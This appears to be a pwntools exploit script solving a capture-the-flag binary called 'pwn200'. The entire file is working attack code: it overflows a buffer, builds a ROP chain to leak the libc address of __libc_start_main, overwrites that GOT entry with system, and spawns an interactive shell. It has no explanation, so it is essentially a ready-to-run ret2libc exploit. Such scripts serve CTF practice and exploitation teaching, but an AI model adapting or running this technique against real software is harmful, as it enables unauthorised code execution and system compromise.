#!/usr/bin/env python2
from pwn import *

io = process("./pwn200")

binary = ELF("pwn200")
libc = ELF("/usr/lib32/libc.so.6")

payload0 = 'syclover\x00\x00123456'+'\xef' # second write len
io.send(payload0)

payload1 = '1' * 0x9c
payload1 += '2345'

rop = ROP(binary)
rop.write(1, binary.got["__libc_start_main"], 4)
rop.read(0, binary.got["__libc_start_main"], 8)
rop.call(binary.plt["__libc_start_main"], (binary.got["__libc_start_main"] + 4,))
payload1 += rop.chain()
print rop.dump()

io.send(payload1)

buf = io.readrepeat(timeout=0.5)
lib_main_add = u32(buf[-4:])

system_add = lib_main_add - libc.symbols["__libc_start_main"] + libc.symbols["system"]
payload2 = p32(system_add)
payload2 += 'sh\x00\x00'

io.send(payload2+'\n')
io.interactive()
